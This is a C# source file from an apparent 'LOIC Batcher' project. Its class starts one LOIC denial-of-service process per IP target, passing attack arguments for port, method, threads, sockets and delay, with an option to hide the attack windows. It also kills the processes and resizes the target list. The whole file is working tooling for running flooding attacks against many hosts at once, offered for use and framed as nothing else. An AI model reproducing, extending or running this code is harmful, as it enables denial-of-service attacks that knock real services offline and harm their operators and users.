using System.Diagnostics;
using System.Text.Json.Serialization;

namespace LOIC_Batcher
{
    public class TargetCollection
    {
        public int TargetCount { get; set; } = 0;
        public IPTarget[]? Targets { get; set; }
        [JsonIgnore] public Process?[]? processes;

        public void Attack(BatchSetting batchSetting, GlobalSetting globalSetting)
        {
            if (Targets == null)
                return;
            if (processes == null)
                processes = new Process[Targets.Length];
            for (int i = 0; i < Targets.Length; i++)
            {
                string args = $"/attack {Targets[i].Ip} {Targets[i].Port} {Targets[i].Method}";
                args += $" {batchSetting.Threads} {batchSetting.Sockets} {batchSetting.Delay}";
                if (batchSetting.Hidden)
                    args += " /hidden";
                processes[i] = Process.Start(globalSetting.LoicPath, args);
            }
        }

        public void Stop()
        {
            if (processes == null)
                return;
            for (int i = 0; i < processes.Length; i++)
            {
                Process? process = processes[i];
                if (process == null)
                    continue;
                process.Kill();
                process.WaitForExit();
                process.Dispose();
                processes[i] = null;
            }
        }

        public void SetTargetCount(int count)
        {
            TargetCount = count;
            processes = new Process?[TargetCount];
            IPTarget[] targets = new IPTarget[Targets?.Length ?? 0];
            for (int i = 0; i < (Targets?.Length ?? 0); i++)
            {
                targets[i] = Targets[i];
            }
            Targets = new IPTarget[TargetCount];
            if (targets.Length == 0)
            {
                for (int i = 0; i < TargetCount; i++)
                    Targets[i] = new IPTarget();
                return;
            }
            for (int i = 0; i < TargetCount; i++)
                Targets[i] = i >= targets.Length ? targets[targets.Length - 1] : targets[i];
        }
    }
}
